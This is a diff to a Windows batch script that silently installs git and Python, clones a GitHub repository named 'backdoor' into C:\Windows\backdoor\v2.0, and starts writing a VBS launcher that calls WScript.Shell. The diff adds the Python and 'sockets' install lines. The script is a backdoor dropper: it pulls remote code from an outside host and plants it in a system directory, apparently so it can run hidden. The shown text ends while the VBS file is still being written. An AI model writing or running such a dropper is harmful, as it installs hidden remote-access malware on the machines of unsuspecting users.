@@ -1,4 +1,6 @@
 @echo off
+winget install python3.11
+pip install sockets
 winget install git
 git clone https://github.com/Jevelin4k/backdoor/ C:\Windows\backdoor\v2.0
 echo Set WshShell = CreateObject("WScript.Shell") > C:\Windows\backdoor\v2.0\up_2.vbs
